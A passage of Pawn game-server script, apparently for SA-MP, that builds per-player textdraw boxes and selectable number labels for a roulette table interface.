        RouletteTD[playerid][17] = CreatePlayerTextDraw(playerid, 451.666870, 122.592468, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][17], 0.000000, 2.499998);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][17], 479.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][17], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][17], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][17], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][17], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][17], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][17], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][17], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][17], 1);

        RouletteTD[playerid][18] = CreatePlayerTextDraw(playerid, 484.583526, 122.592521, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][18], 0.000000, 2.499999);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][18], 509.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][18], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][18], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][18], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][18], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][18], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][18], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][18], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][18], 1);

        RouletteTD[playerid][19] = CreatePlayerTextDraw(playerid, 147.916870, 153.185028, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][19], 0.000000, 2.499998);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][19], 171.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][19], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][19], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][19], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][19], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][19], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][19], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][19], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][19], 1);

        RouletteTD[playerid][20] = CreatePlayerTextDraw(playerid, 175.000137, 153.703643, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][20], 0.000000, 2.416665);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][20], 198.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][20], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][20], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][20], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][20], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][20], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][20], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][20], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][20], 1);

        RouletteTD[playerid][21] = CreatePlayerTextDraw(playerid, 202.916839, 153.185089, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][21], 0.000000, 2.458331);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][21], 227.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][21], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][21], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][21], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][21], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][21], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][21], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][21], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][21], 1);

        RouletteTD[playerid][22] = CreatePlayerTextDraw(playerid, 231.483413, 153.603622, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][22], 0.000000, 2.374998);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][22], 256.399963, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][22], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][22], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][22], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][22], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][22], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][22], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][22], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][22], 1);

        RouletteTD[playerid][23] = CreatePlayerTextDraw(playerid, 261.050903, 154.140625, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][23], 0.000000, 2.274004);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][23], 286.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][23], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][23], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][23], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][23], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][23], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][23], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][23], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][23], 1);

        RouletteTD[playerid][24] = CreatePlayerTextDraw(playerid, 291.483337, 153.603622, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][24], 0.000000, 2.374998);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][24], 317.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][24], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][24], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][24], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][24], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][24], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][24], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][24], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][24], 1);

        RouletteTD[playerid][25] = CreatePlayerTextDraw(playerid, 321.667541, 153.940597, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][25], 0.000000, 2.289004);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][25], 347.641418, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][25], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][25], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][25], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][25], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][25], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][25], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][25], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][25], 1);

        RouletteTD[playerid][26] = CreatePlayerTextDraw(playerid, 352.733245, 153.603576, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][26], 0.000000, 2.416665);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][26], 378.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][26], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][26], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][26], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][26], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][26], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][26], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][26], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][26], 1);

        RouletteTD[playerid][27] = CreatePlayerTextDraw(playerid, 384.167541, 153.940597, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][27], 0.000000, 2.330671);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][27], 412.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][27], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][27], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][27], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][27], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][27], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][27], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][27], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][27], 1);

        RouletteTD[playerid][28] = CreatePlayerTextDraw(playerid, 417.733276, 153.603576, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][28], 0.000000, 2.333331);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][28], 446.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][28], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][28], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][28], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][28], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][28], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][28], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][28], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][28], 1);

        RouletteTD[playerid][29] = CreatePlayerTextDraw(playerid, 451.667541, 153.422042, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][29], 0.000000, 2.330671);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][29], 479.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][29], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][29], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][29], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][29], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][29], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][29], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][29], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][29], 1);

        RouletteTD[playerid][30] = CreatePlayerTextDraw(playerid, 484.399963, 154.122085, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][30], 0.000000, 2.333331);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][30], 509.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][30], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][30], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][30], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][30], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][30], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][30], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][30], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][30], 1);

        RouletteTD[playerid][31] = CreatePlayerTextDraw(playerid, 147.500823, 184.014663, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][31], 0.000000, 2.664005);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][31], 171.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][31], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][31], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][31], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][31], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][31], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][31], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][31], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][31], 1);

        RouletteTD[playerid][32] = CreatePlayerTextDraw(playerid, 175.233322, 183.677612, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][32], 0.000000, 2.791665);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][32], 198.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][32], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][32], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][32], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][32], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][32], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][32], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][32], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][32], 1);

        RouletteTD[playerid][33] = CreatePlayerTextDraw(playerid, 202.917434, 184.014633, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][33], 0.000000, 2.664005);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][33], 227.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][33], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][33], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][33], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][33], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][33], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][33], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][33], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][33], 1);

        RouletteTD[playerid][34] = CreatePlayerTextDraw(playerid, 231.900054, 183.677612, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][34], 0.000000, 2.708332);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][34], 256.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][34], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][34], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][34], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][34], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][34], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][34], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][34], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][34], 1);

        RouletteTD[playerid][35] = CreatePlayerTextDraw(playerid, 260.834136, 184.014633, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][35], 0.000000, 2.664005);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][35], 286.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][35], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][35], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][35], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][35], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][35], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][35], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][35], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][35], 1);

        RouletteTD[playerid][36] = CreatePlayerTextDraw(playerid, 291.483367, 184.196105, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][36], 0.000000, 2.708332);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][36], 317.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][36], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][36], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][36], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][36], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][36], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][36], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][36], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][36], 1);

        RouletteTD[playerid][37] = CreatePlayerTextDraw(playerid, 322.084136, 184.014648, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][37], 0.000000, 2.664005);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][37], 348.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][37], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][37], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][37], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][37], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][37], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][37], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][37], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][37], 1);

        RouletteTD[playerid][38] = CreatePlayerTextDraw(playerid, 352.733398, 184.196090, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][38], 0.000000, 2.666666);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][38], 378.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][38], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][38], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][38], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][38], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][38], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][38], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][38], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][38], 1);

        RouletteTD[playerid][39] = CreatePlayerTextDraw(playerid, 383.750762, 184.014617, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][39], 0.000000, 2.747338);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][39], 413.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][39], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][39], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][39], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][39], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][39], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][39], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][39], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][39], 1);

        RouletteTD[playerid][40] = CreatePlayerTextDraw(playerid, 417.733306, 184.196121, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][40], 0.000000, 2.791666);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][40], 446.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][40], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][40], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][40], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][40], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][40], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][40], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][40], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][40], 1);

        RouletteTD[playerid][41] = CreatePlayerTextDraw(playerid, 450.834075, 184.014617, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][41], 0.000000, 2.747338);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][41], 480.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][41], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][41], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][41], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][41], 255);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][41], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][41], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][41], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][41], 1);

        RouletteTD[playerid][42] = CreatePlayerTextDraw(playerid, 484.816589, 183.677627, "box");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][42], 0.000000, 2.749999);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][42], 509.000000, 0.000000);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][42], 1);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][42], -1);
        PlayerTextDrawUseBox(playerid, RouletteTD[playerid][42], 1);
        PlayerTextDrawBoxColor(playerid, RouletteTD[playerid][42], -2147483393);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][42], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][42], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][42], 1);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][42], 1);

        RouletteTD[playerid][43] = CreatePlayerTextDraw(playerid, 159.166656, 125.185157, "1");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][43], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][43], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][43], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][43], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][43], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][43], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][43], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][43], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][43], true);

        RouletteTD[playerid][44] = CreatePlayerTextDraw(playerid, 187.083312, 124.666648, "2");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][44], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][44], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][44], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][44], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][44], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][44], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][44], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][44], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][44], true);

        RouletteTD[playerid][45] = CreatePlayerTextDraw(playerid, 214.583358, 124.666633, "3");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][45], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][45], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][45], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][45], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][45], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][45], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][45], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][45], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][45], true);

        RouletteTD[playerid][46] = CreatePlayerTextDraw(playerid, 243.750061, 124.666633, "4");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][46], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][46], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][46], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][46], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][46], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][46], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][46], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][46], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][46], true);

        RouletteTD[playerid][47] = CreatePlayerTextDraw(playerid, 273.333404, 124.666625, "5");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][47], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][47], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][47], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][47], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][47], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][47], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][47], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][47], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][47], true);

        RouletteTD[playerid][48] = CreatePlayerTextDraw(playerid, 304.583374, 125.185142, "6");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][48], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][48], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][48], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][48], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][48], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][48], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][48], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][48], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][48], true);

        RouletteTD[playerid][49] = CreatePlayerTextDraw(playerid, 334.583343, 125.185142, "7");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][49], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][49], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][49], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][49], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][49], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][49], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][49], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][49], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][49], true);

        RouletteTD[playerid][50] = CreatePlayerTextDraw(playerid, 364.866729, 125.048095, "8");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][50], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][50], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][50], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][50], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][50], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][50], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][50], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][50], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][50], true);

        RouletteTD[playerid][51] = CreatePlayerTextDraw(playerid, 397.850097, 125.048095, "9");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][51], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][51], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][51], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][51], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][51], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][51], 255);
        PlayerTextDrawFont(playerid, RouletteTD[playerid][51], 3);
        PlayerTextDrawSetProportional(playerid, RouletteTD[playerid][51], 1);
        PlayerTextDrawSetSelectable(playerid, RouletteTD[playerid][51], true);

        RouletteTD[playerid][52] = CreatePlayerTextDraw(playerid, 431.983459, 125.048103, "10");
        PlayerTextDrawLetterSize(playerid, RouletteTD[playerid][52], 0.400000, 1.600000);
        PlayerTextDrawTextSize(playerid, RouletteTD[playerid][52], 15.0, 15.0);
        PlayerTextDrawAlignment(playerid, RouletteTD[playerid][52], 2);
        PlayerTextDrawColor(playerid, RouletteTD[playerid][52], -1);
        PlayerTextDrawSetShadow(playerid, RouletteTD[playerid][52], 0);
        PlayerTextDrawBackgroundColor(playerid, RouletteTD[playerid][52], 255);
